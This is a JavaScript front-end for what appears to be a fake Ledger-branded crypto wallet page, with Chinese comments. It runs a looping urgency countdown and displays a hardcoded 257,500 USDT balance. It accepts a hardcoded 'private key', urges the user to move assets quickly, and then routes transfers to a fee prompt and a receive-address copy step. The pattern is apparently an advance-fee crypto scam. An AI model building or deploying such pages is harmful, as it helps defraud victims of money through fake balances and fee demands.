// 粒子背景初始化
particlesJS("particles", {
    particles: {
        number: { value: 50, density: { enable: true, value_area: 800 } },
        color: { value: ["#00FFFF", "#FF00FF", "#FFFFFF"] },
        shape: { type: "circle" },
        opacity: { value: 0.2, random: true },
        size: { value: 1.5, random: true },
        line_linked: { enable: true, distance: 150, color: "#00FFFF", opacity: 0.1, width: 1 },
        move: {
            enable: true,
            speed: 1,
            direction: "none",
            random: true,
            straight: false,
            out_mode: "out",
        },
    },
    interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" } } },
    retina_detect: true,
});

// 倒计时
let countdown = 500;
const minutesElement = document.getElementById("countdown-minutes");
const secondsElement = document.getElementById("countdown-seconds");

function updateCountdown() {
    const minutes = Math.floor(countdown / 60);
    const seconds = countdown % 60;
    minutesElement.textContent = minutes;
    secondsElement.textContent = seconds < 10 ? `0${seconds}` : seconds;
    countdown = countdown > 0 ? countdown - 1 : 500;
}

updateCountdown();
setInterval(updateCountdown, 1000);

// 主页动画
gsap.from(".ledger-icon", {
    opacity: 0,
    scale: 0.5,
    duration: 1,
    delay: 0.5,
    ease: "elastic.out(1, 0.5)",
});

const titleText = document.querySelector(".title");
titleText.innerHTML = titleText.textContent
    .split("")
    .map((char, i) => `<span style="display:inline-block; z-index: 110">${char}</span>`)
    .join("");
gsap.from(".title span", {
    opacity: 0,
    y: 20,
    duration: 0.5,
    stagger: 0.05,
    delay: 1,
    ease: "power2.out",
    onComplete: () => gsap.set(".title span", { opacity: 1 })
});

gsap.from(".countdown", {
    opacity: 0,
    y: 20,
    duration: 0.5,
    delay: 1.5,
    ease: "power2.out",
    onComplete: () => gsap.set(".countdown", { opacity: 1 })
});

gsap.from(".secondary-button", {
    scale: 0.5,
    opacity: 0,
    duration: 1,
    delay: 2,
    ease: "elastic.out(1, 0.5)",
    onComplete: () => gsap.set(".secondary-button", { opacity: 1 })
});

gsap.from(".fifth-button", {
    scale: 0.5,
    opacity: 0,
    duration: 1,
    delay: 2.3,
    ease: "elastic.out(1, 0.5)",
    onComplete: () => gsap.set(".fifth-button", { opacity: 1 })
});

gsap.from(".quaternary-button", {
    scale: 0.5,
    opacity: 0,
    duration: 1,
    delay: 2.6,
    ease: "elastic.out(1, 0.5)",
    onComplete: () => gsap.set(".quaternary-button", { opacity: 1 })
});

gsap.from(".security-note", {
    opacity: 0,
    y: 20,
    duration: 0.5,
    delay: 2.9,
    ease: "power2.out",
    onComplete: () => gsap.set(".security-note", { opacity: 1 })
});

// 格式化 USDT 余额为美元格式
const usdtBalance = 257500;
document.getElementById('usdt-balance').textContent = usdtBalance.toLocaleString('en-US', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
}) + ' USDT';

// 弹窗控制
function showModal(modalId) {
    const modal = document.getElementById(modalId);
    modal.style.display = 'block';
    document.getElementById('home-page').style.display = 'none';
    animateModal(modal);
    if (modalId === 'private-key-modal') {
        document.getElementById('private-key-input').value = '';
    } else if (modalId === 'transfer-modal') {
        document.getElementById('transfer-address').value = '';
        document.getElementById('transfer-amount').value = '';
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    gsap.to(modal, {
        opacity: 0,
        duration: 0.5,
        onComplete: () => {
            modal.style.display = 'none';
            modal.style.opacity = '1';
            if (modalId !== 'balance-modal') {
                document.getElementById('home-page').style.display = 'block';
            }
        }
    });
}

function animateModal(modal) {
    gsap.from(modal.querySelector('.ledger-icon'), {
        opacity: 0,
        scale: 0.5,
        duration: 1,
        ease: "elastic.out(1, 0.5)",
    });
    gsap.from(modal.querySelector('.modal-content'), {
        opacity: 0,
        y: 20,
        duration: 0.5,
        delay: 0.5,
        ease: "power2.out",
    });
}

// 私钥验证
function verifyPrivateKey() {
    const input = document.getElementById('private-key-input').value;
    const correctKey = '0x257kNJFohklexbcymqapHYFkyNM'; // 修改私钥值，开头从 'O' 改为 '0'
    const resultModal = document.getElementById('key-result-modal');
    const resultText = document.getElementById('key-result-text');
    const nextButton = document.getElementById('next-button');

    closeModal('private-key-modal');
    showModal('key-result-modal');

    if (input === correctKey) {
        resultText.textContent = '私钥正确，请尽快转移资产到安全地址';
        nextButton.style.display = 'block';
    } else {
        resultText.textContent = '私钥错误，请重新验证私钥正确性后再试';
        nextButton.style.display = 'none';
    }
}

function nextStep() {
    closeModal('key-result-modal');
    showModal('balance-modal');
}

// 验证 Ethereum 地址
function isValidEthereumAddress(address) {
    const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
    return ethAddressRegex.test(address);
}

// 转账下一步
function transferNext() {
    const amount = parseFloat(document.getElementById('transfer-amount').value);
    const address = document.getElementById('transfer-address').value;
    const maxUsdtBalance = 257500;

    if (isNaN(amount) || amount <= 0) {
        alert('请输入有效的转账数量');
        return;
    }

    if (amount > maxUsdtBalance) {
        closeModal('transfer-modal');
        showModal('balance-insufficient-modal');
        return;
    }

    if (!isValidEthereumAddress(address)) {
        closeModal('transfer-modal');
        showModal('address-error-modal');
        return;
    }

    closeModal('transfer-modal');
    showModal('fee-modal');
}

// 复制地址
function copyAddress() {
    const address = document.querySelector('.receive-address').textContent;
    navigator.clipboard.writeText(address).then(() => {
        const toast = document.getElementById('copy-toast');
        toast.style.display = 'block';
        setTimeout(() => {
            toast.style.display = 'none';
            closeModal('receive-modal');
        }, 1500);
    });
}
